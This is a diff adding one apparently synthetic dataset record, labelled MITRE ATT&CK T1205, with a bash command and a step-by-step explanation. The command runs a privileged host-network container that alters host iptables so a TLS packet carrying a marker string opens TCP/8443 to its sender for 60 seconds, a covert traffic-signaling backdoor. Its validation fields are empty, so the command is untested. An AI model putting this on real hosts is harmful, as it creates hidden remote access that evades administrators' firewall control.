@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "docker run --rm --net=host --cap-add=NET_ADMIN alpine sh -c \"apk add --no-cache iptables >/dev/null && iptables -I INPUT -p tcp --dport 443 -m string --string 'covert-signal.example' --algo bm -j LOG --log-prefix 'T1205_TLS_SNI ' --log-level 4 && iptables -I INPUT -p tcp --dport 443 -m string --string 'covert-signal.example' --algo bm -m recent --name t1205_tls --set && iptables -I INPUT -p tcp --dport 8443 -m recent --name t1205_tls --rcheck --seconds 60 --reap -j ACCEPT\"",
+  "explanation": "Matches a TLS ClientHello/SNI host token 'covert-signal.example' on TCP/443 as the traffic signal. When seen, the host logs the event and temporarily opens TCP/8443 to the source IP, using application-layer TLS content as the trigger.",
+  "rationale_steps": [
+    "Manipulate host iptables from a container using host networking.",
+    "Use string match on TLS/SNI bytes for an application-specific covert signal.",
+    "Record in recent list and allow 8443 for the signaled source for 60 seconds."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-4970f6eb-7b45e199",
+  "source_prompt_hash": "4970f6eb",
+  "timestamp_utc": "2025-09-30T03:38:51.523409Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
